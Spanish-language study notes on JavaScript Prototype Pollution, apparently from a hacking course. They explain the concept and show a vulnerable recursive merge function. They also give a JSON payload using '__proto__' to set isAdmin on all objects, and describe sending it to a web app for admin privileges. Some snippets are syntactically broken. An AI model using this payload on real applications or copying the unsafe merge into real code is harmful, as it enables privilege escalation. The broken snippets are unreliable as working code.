El ataque **Prototype Pollution** es una técnica de ataque que aprovecha las vulnerabilidades en la implementación de objetos en JavaScript. Esta técnica de ataque se utiliza para modificar la propiedad “**prototype**” de un objeto en una aplicación web, lo que puede permitir al atacante ejecutar código malicioso o manipular los datos de la aplicación.
https://medium.com/node-modules/what-is-prototype-pollution-and-why-is-it-such-a-big-deal-2dd8d89a93c

El código mira al prototipo que es el origen del objeto
{
	email: 'test@test.com'
	 msg 'Hola esto es una prueba'
	 ipAddress: '127.0.0.1'
}

var body = JSON.parse('{"email" : "test@test.com", "msg": "Hola esto es una prueba"})
console.log(merge({"ipAddress: req.ip" : "127.0.0.1", body}))
![[Pasted image 20240616124959.png]]

```JS
var S4vitar = {"name": "Marcel", "age": 27 }
var admin = {"name": "joe Doe", "age": 57, "isAdmin":true}

console.log("¿El usuario admin es administrador? -> " + admin.isAdmin)
```
![[Pasted image 20240616125601.png]]
```
var merge = function(target, source) {
    for(var attr in source) {
        if(typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
            merge(target[attr], source[attr]);
        } else {
            target[attr] = source[attr];
        }
    }
    return target;
};


var S4vitar = {"name": "Marcel", "age": 27 }
var admin = {"name": "joe Doe", "age": 57, "isAdmin":true}

var body = JSON.parse('{"email" : "test@test.com", "msg": "Hola esto es una prueba"}')
console.log(merge({"ipAddress: req.ip" : "127.0.0.1", body}))

console.log("¿El usuario admin es administrador? -> " + admin.isAdmin)
```
Podría añadir un nuevo campo que sea prototype
```JS
var merge = function(target, source) {
    for(var attr in source) {
        if(typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
            merge(target[attr], source[attr]);
        } else {
            target[attr] = source[attr];
        }
    }
    return target;
};


var S4vitar = {"name": "Marcel", "age": 27 }
var admin = {"name": "joe Doe", "age": 57, "isAdmin":true}

var body = JSON.parse('{"email" : "test@test.com", "msg": "Hola esto es una prueba"}, "__proto__":{"isAdmin": true}}'); // nuevo añadido y hereda este valor
console.log(merge({"ipAddress: req.ip" : "127.0.0.1", body}))

//console.log("¿El usuario admin es administrador? -> " + {}.isAdmin)
console.log({}.isAdmin)
```
En JavaScript, la propiedad “prototype” se utiliza para definir las propiedades y métodos de un objeto. Los atacantes pueden explotar esta característica de JavaScript para modificar las propiedades y métodos de un objeto y tomar el control de la aplicación.

El ataque de Prototype Pollution se produce cuando un atacante modifica la propiedad “prototype” de un objeto en una aplicación web. Esto se puede lograr mediante la manipulación de datos que se envían a través de formularios o solicitudes AJAX, o mediante la inserción de código malicioso en el código JavaScript de la aplicación.

Una vez que el objeto ha sido manipulado, el atacante puede ejecutar código malicioso en la aplicación, manipular los datos de la aplicación o tomar el control de la sesión de un usuario. Por ejemplo, un atacante podría modificar la propiedad “prototype” de un objeto de autenticación de usuario para permitir el acceso a una cuenta sin la necesidad de una contraseña.

El impacto de la explotación del ataque Prototype Pollution puede ser significativo, ya que los atacantes pueden tomar el control de la aplicación o comprometer los datos de los usuarios. Además, dado que el ataque se basa en vulnerabilidades en la implementación de objetos en JavaScript, puede ser difícil de detectar y corregir.
Pasandole el proto hago que herede las caracteristicas del objeto
![[Pasted image 20240616130756.png]]
Ahora le metemos el proto para que tenga los privilegios del admin
![[Pasted image 20240616130950.png]]
Cambiamos en content type, la última parte a json, y agregamos un json
![[Pasted image 20240616131017.png]]
Y agregandole el siguiente json estamos hechos
![[Pasted image 20240616131150.png]]